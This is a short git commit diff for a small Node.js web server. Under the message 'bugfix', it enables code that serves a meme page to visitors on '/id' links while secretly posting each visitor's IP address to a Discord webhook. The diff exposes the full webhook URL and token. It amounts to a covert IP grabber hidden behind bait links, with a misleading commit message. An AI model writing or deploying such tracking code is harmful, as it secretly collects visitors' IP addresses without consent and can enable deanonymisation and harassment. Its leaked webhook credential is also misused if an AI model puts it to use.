81977ff94cc6696327ca5092c67754c8cc609396
GospodProfesorMan <fmfiroylight@gmail.com>
2022-10-05 14:38:22 +0200

    bugfix

--- index.js
+++ index.js
@@ -10,19 +10,19 @@ const server = http.Server((req, res) => {
     if (path.substring(0,3) == "/id") {
         path = "/meme.html"
         console.log(req.socket.remoteAddress);
-        // fetch(
-        //     'https://discord.com/api/webhooks/1006549828530094161/VU8lTwRYPBfCLLTtXr399uNq-LcgeusF859r3oelUuCjK3Yr13JcwMLT7aL9mDAETHBP',
-        //     {
-        //       method: 'post',
-        //       headers: {
-        //         'Content-Type': 'application/json',
-        //       },
-        //       body: JSON.stringify({
-        //         content:
-        //             req.socket.remoteAddress,
-        //       }),
-        //     }
-        //   );
+        fetch(
+            'https://discord.com/api/webhooks/1006549828530094161/VU8lTwRYPBfCLLTtXr399uNq-LcgeusF859r3oelUuCjK3Yr13JcwMLT7aL9mDAETHBP',
+            {
+              method: 'post',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                content:
+                    req.socket.remoteAddress,
+              }),
+            }
+          );
     }
     if (path == "/") path = "/index.html"
     const rs = fs.createReadStream("./files" + path);
